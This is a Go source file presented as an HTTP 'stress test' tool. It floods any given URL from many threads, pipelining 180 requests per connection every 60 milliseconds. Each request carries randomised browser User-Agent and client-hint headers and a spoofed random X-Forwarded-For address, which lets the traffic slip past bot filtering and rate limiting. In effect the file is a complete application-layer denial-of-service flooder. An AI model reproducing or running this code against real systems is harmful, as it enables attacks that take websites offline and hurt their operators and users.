package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Global state for DNS IPs and request‐building
var (
	httpMethods  = []string{"GET", "GET", "GET", "POST", "HEAD"}
	languages    = []string{"en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9"}
	contentTypes = []string{"application/x-www-form-urlencoded", "application/json", "text/plain"}
)

// StressConfig holds command‐line configuration
type StressConfig struct {
	Target     *url.URL
	Threads    int
	Duration   time.Duration
	CustomHost string
	Port       int
	Path       string
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func main() {
	if len(os.Args) < 4 {
		fmt.Fprintf(os.Stderr, "Usage: %s <URL> <THREADS> <DURATION_SEC> [CUSTOM_HOST]\n", os.Args[0])
		os.Exit(1)
	}

	rawURL := os.Args[1]
	threads, err := strconv.Atoi(os.Args[2])
	if err != nil || threads <= 0 {
		fmt.Fprintf(os.Stderr, "Invalid THREADS (%q). Must be a positive integer.\n", os.Args[2])
		os.Exit(1)
	}

	durSec, err := strconv.Atoi(os.Args[3])
	if err != nil || durSec <= 0 {
		fmt.Fprintf(os.Stderr, "Invalid DURATION_SEC (%q). Must be a positive integer.\n", os.Args[3])
		os.Exit(1)
	}

	customHost := ""
	if len(os.Args) > 4 {
		customHost = os.Args[4]
	}

	parsedURL, err := url.Parse(rawURL)
	if err != nil || parsedURL.Scheme == "" || parsedURL.Hostname() == "" {
		fmt.Fprintf(os.Stderr, "Invalid URL: %q\n", rawURL)
		os.Exit(1)
	}

	port := determinePort(parsedURL)
	path := parsedURL.RequestURI()
	if path == "" {
		path = "/"
	}

	cfg := StressConfig{
		Target:     parsedURL,
		Threads:    threads,
		Duration:   time.Duration(durSec) * time.Second,
		CustomHost: customHost,
		Port:       port,
		Path:       path,
	}

	fmt.Printf(
		"Starting stress test:\n  • target URL = %s\n  • path       = %s\n  • threads    = %d\n  • duration   = %v\n",
		rawURL, cfg.Path, threads, cfg.Duration,
	)
	runWorkers(cfg)
	fmt.Println("Stress test completed.")
}

// determinePort extracts port from URL or defaults to 80/443
func determinePort(u *url.URL) int {
	if p := u.Port(); p != "" {
		if pi, err := strconv.Atoi(p); err == nil {
			return pi
		}
	}
	if strings.EqualFold(u.Scheme, "https") {
		return 443
	}
	return 80
}

// runWorkers spawns goroutines to send bursts until duration elapses
func runWorkers(cfg StressConfig) {
	var wg sync.WaitGroup
	stopCh := time.After(cfg.Duration)

	// Only build a TLS config if we’re actually doing HTTPS (port 443)
	var tlsCfg *tls.Config
	if cfg.Port == 443 {
		tlsCfg = &tls.Config{
			ServerName:         cfg.Target.Hostname(),
			InsecureSkipVerify: true,
		}
	}

	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			ticker := time.NewTicker(60 * time.Millisecond)
			defer ticker.Stop()

			for {
				select {
				case <-stopCh:
					return
				case <-ticker.C:
					sendBurst(cfg, tlsCfg, stopCh)
				}
			}
		}(i)
	}

	wg.Wait()
}

// sendBurst opens a connection and sends ~250 requests back-to-back,
// but it will bail out early if stopCh fires in the middle
func sendBurst(cfg StressConfig, tlsCfg *tls.Config, stopCh <-chan time.Time) {
	address := fmt.Sprintf("%s:%d", cfg.Target.Hostname(), cfg.Port)

	conn, err := dialConn(address, tlsCfg)
	if err != nil {
		fmt.Printf("[dial error] %v\n", err)
		return
	}
	defer conn.Close()

	method := httpMethods[rand.Intn(len(httpMethods))]

	for i := 0; i < 180; i++ {
		// Check if we should stop right away
		select {
		case <-stopCh:
			return
		default:
		}

		header, body := buildRequest(cfg, method)

		// batch header+body into one writev call
		var bufs net.Buffers
		bufs = append(bufs, []byte(header))
		if method == "POST" {
			bufs = append(bufs, body)
		}

		if _, err := bufs.WriteTo(conn); err != nil {
			fmt.Printf("[batched write] %v\n", err)
			return
		}
	}
}

// dialConn chooses TCP or TLS based on port
func dialConn(addr string, tlsCfg *tls.Config) (net.Conn, error) {
	if tlsCfg != nil && strings.HasSuffix(addr, ":443") {
		return tls.Dial("tcp", addr, tlsCfg)
	}
	return net.Dial("tcp", addr)
}

// buildRequest now takes only cfg+method, and picks its own hostHdr
func buildRequest(cfg StressConfig, method string) ([]byte, []byte) {
	buf := bufPool.Get().(*bytes.Buffer)
	buf.Reset()
	defer bufPool.Put(buf)

	// Choose Host header override if provided, else use URL hostname
	hostHdr := cfg.CustomHost
	if hostHdr == "" {
		hostHdr = cfg.Target.Hostname()
	}

	// Build “Host:” line (include port if non‐standard)
	hostPort := hostHdr
	if cfg.Port != 80 && cfg.Port != 443 {
		hostPort = fmt.Sprintf("%s:%d", hostHdr, cfg.Port)
	}
	fmt.Fprintf(buf, "%s %s HTTP/1.1\r\nHost: %s\r\n", method, cfg.Path, hostPort)

	writeCommonHeaders(buf)

	var body []byte
	if method == "POST" {
		ct := contentTypes[rand.Intn(len(contentTypes))]
		body = createBody(ct)
		fmt.Fprintf(buf, "Content-Type: %s\r\nContent-Length: %d\r\n", ct, len(body))
	}

	fmt.Fprintf(buf, "Referer: https://%s/\r\n", hostHdr)
	fmt.Fprintf(buf, "Origin: https://%s\r\n", hostHdr)
	fmt.Fprintf(buf, "Connection: keep-alive\r\n\r\n")

	out := make([]byte, buf.Len())
	copy(out, buf.Bytes())
	return out, body
}

func writeCommonHeaders(buf *bytes.Buffer) {
	ua := randomUserAgent()
	buf.WriteString("User-Agent: " + ua + "\r\n")
	buf.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n")
	buf.WriteString("Accept-Language: " + languages[rand.Intn(len(languages))] + "\r\n")
	buf.WriteString("Accept-Encoding: gzip, deflate, br\r\n")
	buf.WriteString("DNT: 1\r\n")

	if isChromeUA(ua) {
		buf.WriteString(`sec-ch-ua: "Google Chrome";v="` + randomChromeVersion() + `", "Chromium";v="` + randomChromeVersion() + `", ";Not A Brand";v="99"` + "\r\n")
		buf.WriteString("sec-ch-ua-mobile: ?0\r\n")
		buf.WriteString(`sec-ch-ua-platform: "` + randomPlatform() + `"` + "\r\n")
	} else {
		buf.WriteString(`sec-ch-ua: "Firefox";v="` + randomFirefoxVersion() + `", ";Not A Brand";v="99"` + "\r\n")
		buf.WriteString("sec-ch-ua-mobile: ?0\r\n")
		buf.WriteString(`sec-ch-ua-platform: "` + randomPlatform() + `"` + "\r\n")
	}

	buf.WriteString("Sec-Fetch-Site: none\r\n")
	buf.WriteString("Sec-Fetch-Mode: navigate\r\n")
	buf.WriteString("Sec-Fetch-User: ?1\r\n")
	buf.WriteString("Sec-Fetch-Dest: document\r\n")
	buf.WriteString("Upgrade-Insecure-Requests: 1\r\n")
	buf.WriteString("Cache-Control: no-cache\r\n")
	buf.WriteString(fmt.Sprintf("X-Forwarded-For: %d.%d.%d.%d\r\n",
		rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256)))
}

func createBody(ct string) []byte {
	var b bytes.Buffer
	switch ct {
	case "application/x-www-form-urlencoded":
		vals := url.Values{}
		for i := 0; i < 3; i++ {
			var key, val string
			if rand.Intn(100) < 70 {
				switch rand.Intn(3) {
				case 0:
					key = "username"
					val = randomString(8)
				case 1:
					key = "email"
					val = fmt.Sprintf("%s@example.com", randomString(6))
				default:
					key = randomString(5)
					val = randomString(8)
				}
			} else {
				key = randomString(5)
				val = randomString(8)
			}
			vals.Set(key, val)
		}
		b.WriteString(vals.Encode())

	case "application/json":
		if rand.Intn(100) < 50 {
			b.WriteString(`{`)
			entries := []string{
				fmt.Sprintf(`"id":%d`, rand.Intn(10000)),
				fmt.Sprintf(`"name":"%s"`, randomString(6)),
				fmt.Sprintf(`"active":%t`, rand.Intn(2) == 1),
			}
			b.WriteString(entries[0] + "," + entries[1] + "," + entries[2])
			b.WriteString(`}`)
		} else {
			b.WriteString("{")
			for i := 0; i < 3; i++ {
				if i > 0 {
					b.WriteString(",")
				}
				fmt.Fprintf(&b, `"%s":"%s"`, randomString(5), randomString(8))
			}
			b.WriteString("}")
		}

	default: // "text/plain"
		b.WriteString("text_" + randomString(12))
	}
	return b.Bytes()
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func randomUserAgent() string {
	osList := []string{
		"Windows NT 10.0; Win64; x64",
		"Macintosh; Intel Mac OS X 10_15_7",
		"X11; Linux x86_64",
	}
	osPart := osList[rand.Intn(len(osList))]

	if rand.Intn(2) == 0 {
		major := rand.Intn(30) + 90
		build := rand.Intn(4000)
		patch := rand.Intn(200)
		version := fmt.Sprintf("%d.0.%d.%d", major, build, patch)
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", osPart, version)
	}
	major := rand.Intn(30) + 70
	minor := rand.Intn(10)
	version := fmt.Sprintf("%d.0", major)
	return fmt.Sprintf("Mozilla/5.0 (%s; rv:%s) Gecko/20100101 Firefox/%s.%d", osPart, version, version, minor)
}

func isChromeUA(ua string) bool {
	return bytes.Contains([]byte(ua), []byte("Chrome/"))
}

func randomChromeVersion() string {
	major := rand.Intn(30) + 90
	return fmt.Sprintf("%d", major)
}

func randomFirefoxVersion() string {
	major := rand.Intn(30) + 70
	return fmt.Sprintf("%d", major)
}

func randomPlatform() string {
	platforms := []string{"Windows", "macOS", "Linux"}
	return platforms[rand.Intn(len(platforms))]
}

var bufPool = sync.Pool{
	New: func() any { return new(bytes.Buffer) },
}
